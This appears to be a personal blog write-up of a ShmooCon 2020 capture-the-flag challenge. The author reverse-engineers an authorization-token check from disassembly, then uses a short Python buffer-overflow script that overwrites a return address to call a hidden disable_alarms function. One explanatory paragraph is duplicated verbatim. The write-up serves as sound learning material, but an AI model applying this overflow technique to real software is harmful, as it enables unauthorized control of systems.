---
layout: post
title: Binex at ShmooCon
subtitle: My first exposure to binary exploitation
image: /assets/img/schmoocon/pictures/scenario.png
tags: binex
---


At ShmooCon 2020, RET2 Systems was hosting a [challenge](https://wargames.ret2.systems/level/shmoo2020) where they had prototype waterbottles held within a laser system with alarms, run off of a Raspberry Pi. The goal was to access the Raspberry Pi, disable the lasers and alarms, all within their provided Wargames environment. 

![](/assets/img/schmoocon/pictures/assets.png)

Provided with the disassembly, data, source, and python script to run an interactive response, you were left to your own devices to figure out a way to run 

---
## Dawn of the first day
---
Pretty much busy the day we got to ShmooCon, so I didn't do much with the challenge. I did, however, look at the disassembly, and then noped out because I had never done disassembly (a mistake on my part)


---
## Dawn of the second day
---
I was strongly against starting my journey into binary exploitation, but because my teammates flatearth and kimpossible had solved the challenge, I thought "if they can do it, i can too."

The day started off with 25 water bottles left, it seemed reasonable that I would find my way to getting one. 

The code provided had recommended that we look into the function `validate_authorization_token`, so I set a breakpoint at that function

```
break validate_authorization_token
```
---
## Analyzing the first jump
---
```
Function validate_authorization_token
400b1d:  push    rbp
400b1e:  mov     rbp, rsp
400b21:  push    rbx
400b22:  sub     rsp, 0x28
400b26:  mov     qword [rbp-0x28], rdi
400b2a:  mov     qword [rbp-0x30], rsi
400b2e:  mov     rax, qword [rbp-0x28]
400b32:  mov     esi, 0x11
400b37:  mov     rdi, rax
400b3a:  call    strnlen
400b3f:  cmp     rax, 0x11
400b43:  je      0x400b4f
```

Before the first jump function, I saw the following code: 
```
400b3a:  call    strnlen
400b3f:  cmp     rax, 0x11
```
The disassembly was showing that the code was comparing the length of the string stored into rax (the authorization code that we would eventually generate), to the hex code of 0x11 (17 in decimal). If true, then the next step would be to follow the jump instruction, `400b43:  je      0x400b4f`.

I made an authorization token of `00000000000000000`, 17 "0's" just to return true for the compare length function to jump to the next function.


---
## Analyzing the second jump
---
```
400b4f:  mov     rax, qword [rbp-0x28]
400b53:  add     rax, 0x4
400b57:  movzx   eax, byte [rax]
400b5a:  cmp     al, 0x2d
400b5c:  je      0x400b68
```
The first thing I saw was the compare function at `0x400b5a`, that would compare info stored in register al with 0x2d, hex for "-". 

Starting from the beginning, you see that the quad word stored at rbp-0x28 is stored into rax. After being stored into rax, the byte is shifted by 0x4? The byte[rax] is stored into eax, which then the register al is compared to 0x2d ("-" in decimal). This being said, it was seeing if the 4th (0,1,2,3,4) integer was tac, so I changed my authorization token to 0000-000000000000, stepped through the program, and successfully jumped to the next function. 
**In all honesty, this was mostly seeing the 4th integer being compared to tac, and then changing my authorization token and looking at the register to see if al was 0x2d.**


---

## Analyzing the third jump
---
```
400b68:  mov     rax, qword [rbp-0x28]
400b6c:  mov     esi, 0x4
400b71:  mov     rdi, rax
400b74:  call    xorsum
400b79:  mov     ebx, eax
400b7b:  mov     rax, qword [rbp-0x30]
400b7f:  mov     esi, 0x9
400b84:  mov     rdi, rax
400b87:  call    xorsum
400b8c:  cmp     bl, al
400b8e:  je      0x400b9a
```

### *Disclaimer*
*This section is extremely non-scientific, with me testing random numbers and looking at the registers.*

The disassembly was comparing the two registers "al" and "bl", which was the first two characters and last two characters of the first half of the authorization token. Instead of analyzing this section, I decided to input random numbers for the first four of the auth token and look at the registers of al and bl to see if they were being xorsum'd correctly. Again, not the best way to do this.

I was left with `1110-` as the first half of my auth token.

---
## Analyzing the back half of the auth token
---
With the first portion until the tac of the auth token solved correctly, I had the entire 12 back characters to figure out. Luckily, the RET2 team had left a little something for us at `0x400c0d`, where the disassembly outright says `400c0d:  mov     esi, 0x401023  "ret2 systems"`. ret2 systems = 12 characters. Coincidence? I thought not. Instead of looking into whatever voodoo magic the rest of the assembly code was performing, I restarted my program, entered the first 5 of my auth token, and added "ret2 systems" to the end.

My thought process here, was if they are comparing the back half to ret2 systems, I should enter ret2 systems to retrieve whatever the program is expecting to become ret2 systems. It surprisingly worked. After stepping through the looped assembly three times, before the program jumps to the next address I inspected the registers and came across 0x00603015 stored into rbp-0x28. It looked familiar (I forgot from where) and so I used `x /4x 0x00603015` to display 4 bytes of information stored at that address, and it returned a bunch of hex. 

0x00603015 - the address that held the string "ret2 systems" after it had been XOR'd to provide the back half of the authorization token

Keep in mind that the hex returned by the program is displayed in little endian, where the information is stored from left into bottom and right into top, per byte. The returned information was 3 bytes, so I had to reassemble from little endian into a normal readable format. `\x89\xbb\x69\x2b\xdb\xad\x64\x6a\x8f\xbb\x70\x6a` is what I ended up with as the back half of my auth token.Keep in mind that the hex returned by the program is displayed in little endian, where the information is stored from left into bottom and right into top, per byte. The returned information was 3 bytes, so I had to reassemble from little endian into a normal readable format. `\x89\xbb\x69\x2b\xdb\xad\x64\x6a\x8f\xbb\x70\x6a` is what I ended up with as the back half of my auth token.

And voila, we now had a full auth token.

---
## Disabling the systems
---
After deleting my breakpoints, I could now enter as my auth token through the provided python script. The system now authenticates us as a laser technician, and allows us to disable the lasers by entering `disable-systems` which would only disable the lasers, while we wanted to disable both the lasers and alarms. 


`0x400c4e` was a memory address that provided the function to disable the alarms, and I had no idea how to access it. The next step provided a way to access it.

---
## *Whydoesthishateme*
---
Unfortunately, my account was reloaded and all of my code was lost.

*Sigh*

Thankfully, I managed to rerun all the steps I took in order to gain an authorization token, and I had a plan to disable the alarm system this time.

With 3 water bottles left, I accessed the debugger and found my authorization token (which had changed), logged in, and wrote a python script to memory overflow the program and jump to the address of the disable_alarms function. Everything worked fine until I reached the point of utilizing the overflow to point the program towards `400c4e`, where it started to show (I inspected the rax register to see the overflow) hex 0x0a, which is \n in decimal. To correct this error, I added 0's to the back of my pointer to clear that newline, and it worked. In another world, I would have utilized the p64 to pack `0x400c4e` into an 8 byte representation and added that to the back of my overflow. 


Below is the python script that I used to solve the problem.
```
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.readuntil('\n')

p.sendline('1110-' +'\x89\xbb\x69\x2b\xdb\xad\x64\x6a\x8f\xbb\x70\x6a')
p.readuntil('\n')
p.sendline('disable-system')
p.readuntil('\n')
p.sendline('because i wanted to')
p.readuntil('\n')
p.sendline('disable-system')
p.readuntil('\n')

p.sendline('0'*227+ '\x4e\x0c\x40' +'\x00')
p.interactive()
```
It worked perfectly, yet I had missed the chance to get a ret2 systems waterbottle. Kudos to Xasmatwn1 for getting it, and thank you to ret2 systems for hosting this challenge and providing an environment for me to learn.